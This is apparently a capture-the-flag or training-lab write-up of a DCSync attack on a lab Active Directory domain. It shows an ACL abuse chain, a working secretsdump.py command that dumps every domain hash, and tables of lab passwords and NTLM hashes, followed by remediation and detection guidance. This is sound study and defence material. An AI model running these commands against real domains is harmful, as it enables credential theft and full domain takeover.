# DCSync Attack - Active Directory Domain Compromise

> **Educational Purpose:**  
> This documentation explains how excessive Active Directory replication permissions can lead to complete domain compromise during authorized security assessments and lab environments.

---

# Executive Summary

A DCSync attack was performed against the:

```
INLANEFREIGHT.LOCAL
```

domain using the compromised:

```
adunn
```

account.

The account had been granted:

- DS-Replication-Get-Changes
- DS-Replication-Get-Changes-All

permissions.

These privileges allowed the attacker to impersonate a Domain Controller and request password replication data from Active Directory.

The attack successfully extracted:

- NTLM password hashes
- Kerberos keys
- Sensitive account information
- Domain Administrator credentials

---

# Attack Overview

| Item | Details |
|---|---|
| Domain | INLANEFREIGHT.LOCAL |
| Target Account Used | adunn |
| Attack Type | DCSync |
| Technique | Directory Replication Service Abuse |
| Tool Used | Impacket secretsdump.py |
| Domain Controller | 172.16.5.5 |

---

# What is DCSync?

DCSync abuses legitimate Active Directory replication functionality.

Domain Controllers normally replicate directory data between themselves.

An attacker with replication privileges can request this data without being a Domain Controller.

Required permissions:

| Permission | Purpose |
|---|---|
| DS-Replication-Get-Changes | Read directory replication data |
| DS-Replication-Get-Changes-All | Read sensitive password data |

With these permissions, an attacker can retrieve:

- NTLM password hashes
- Kerberos keys
- krbtgt hash
- Domain administrator credentials

---

# Attack Chain

```
svc_qualys
    |
    | ForceChangePassword
    ↓
damundsen
    |
    | GenericWrite
    ↓
Help Desk Level 1
    |
    | Nested Group Membership
    ↓
Information Technology
    |
    | GenericAll
    ↓
adunn
    |
    | DCSync Rights
    ↓
Domain Replication
    |
    ↓
All Domain Hashes Extracted
```

---

# Attack Scenario

The attacker first compromised:

```
svc_qualys
```

with password:

```
security#1
```

Using ACL abuse:

```
svc_qualys
        ↓
ForceChangePassword
        ↓
damundsen
        ↓
GenericWrite
        ↓
Help Desk Level 1
        ↓
Information Technology
        ↓
GenericAll
        ↓
adunn
```

The compromised account:

```
adunn
```

possessed dangerous replication privileges.

---

# Tools Used

| Tool | Purpose |
|---|---|
| Impacket secretsdump.py | Extract Active Directory hashes |
| PowerView | ACL enumeration |
| BloodHound | Visualize attack paths |
| NTDS.dit Replication | Retrieve password data |

---

# Step 1 - Perform DCSync Attack

From the Linux attack machine:

```bash
secretsdump.py -just-dc -outputfile inlanefreight_hashes INLANEFREIGHT/adunn@172.16.5.5
```

The command requests domain replication data using the compromised account.

---

# Step 2 - Review Extracted Data

## View Cleartext Passwords

```bash
cat inlanefreight_hashes.ntds.cleartext
```

This file contains accounts configured with reversible encryption.

---

## View NTLM Hashes

```bash
cat inlanefreight_hashes.ntds
```

Example:

```text
administrator:88ad09182de639ccc6579eb0849751cf
krbtgt:16e26ba33e455a8c338142af8d89ffbc
```

---

## Search Specific User

Example:

```bash
cat inlanefreight_hashes.ntds | grep -i khartsfield
```

---

# Extracted Files

| File | Contents |
|---|---|
| inlanefreight_hashes.ntds | NTLM password hashes |
| inlanefreight_hashes.ntds.cleartext | Reversible encryption passwords |
| inlanefreight_hashes.ntds.kerberos | Kerberos keys |

---

# Key Findings

## Finding 1 - Reversible Encryption Enabled

Accounts discovered:

| Username | Password |
|---|---|
| proxyagent | Pr0xy_ILFREIGHT! |
| syncron | Mycleart3xtP@ss! |

Risk:

🔴 High

Passwords were stored in a reversible format and could be recovered.

---

# Finding 2 - NTLM Hash Exposure

Account:

```
khartsfield
```

NTLM Hash:

```
4bb3b317845f0954200a6b0acc9b9f9a
```

Risk:

🔴 Critical

The hash could potentially be used for:

- Pass-the-Hash attacks
- Unauthorized authentication
- Lateral movement

---

# Finding 3 - Critical Domain Hashes Extracted

| Account | NTLM Hash | Risk |
|---|---|---|
| administrator | 88ad09182de639ccc6579eb0849751cf | Critical |
| krbtgt | 16e26ba33e455a8c338142af8d89ffbc | Critical |
| lab_adm | 663715a1a8b957e8e9943cc98ea451b6 | High |

---

# Why DCSync is Dangerous

A successful DCSync attack can allow an attacker to:

- Dump every domain password hash
- Create Golden Tickets using krbtgt
- Perform Pass-the-Hash attacks
- Compromise Domain Administrator
- Maintain long-term persistence

---

# Security Recommendations

## 1. Remove Unnecessary DCSync Permissions

Users should not have:

```
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
```

unless absolutely required.

Review:

- Domain ACLs
- Delegated permissions
- Privileged groups

---

## 2. Disable Reversible Encryption

Affected accounts:

```
proxyagent
syncron
```

Disable reversible password storage.

Example:

```powershell
Set-ADUser -Identity proxyagent -Replace @{userAccountControl=640}

Set-ADUser -Identity syncron -Replace @{userAccountControl=640}
```

---

## 3. Reset Compromised Passwords

Affected accounts should have credentials rotated.

Example:

```powershell
Set-ADAccountPassword `
-Identity administrator `
-Reset `
-NewPassword (ConvertTo-SecureString "NewComplexPassword123!" -AsPlainText -Force)
```

---

## 4. Enable Monitoring

Monitor:

```
Event ID 4662
```

Look for:

- Directory replication requests
- Unauthorized replication attempts
- Access to sensitive directory objects

---

# Detection Opportunities

Security teams should monitor:

| Event ID | Description |
|---|---|
| 4662 | Directory Service Object Access |
| 4724 | Password Reset |
| 5136 | Directory Object Modification |
| 4769 | Kerberos Service Ticket Requests |

Indicators:

- Replication requests from normal workstations
- Users requesting large amounts of directory data
- Unexpected privileged account activity

---

# Final Compromised Accounts

| Account | Password / Hash |
|---|---|
| svc_qualys | security#1 |
| damundsen | Pwn3d_by_ACLs! |
| adunn | Cracked password |
| proxyagent | Pr0xy_ILFREIGHT! |
| syncron | Mycleart3xtP@ss! |
| khartsfield | 4bb3b317845f0954200a6b0acc9b9f9a |
| administrator | 88ad09182de639ccc6579eb0849751cf |

---

# Key Takeaways

- DCSync does not require Domain Controller access.
- Replication permissions are extremely sensitive.
- A single misconfigured ACL can lead to full domain compromise.
- Protect privileged accounts and replication rights.
- Regularly audit Active Directory permissions.
- BloodHound can identify dangerous privilege escalation paths before attackers do.

---

# References

- MITRE ATT&CK: T1003.006 - DCSync
- Microsoft Active Directory Replication Documentation
- Impacket Documentation
- BloodHound Documentation
- PowerView Documentation
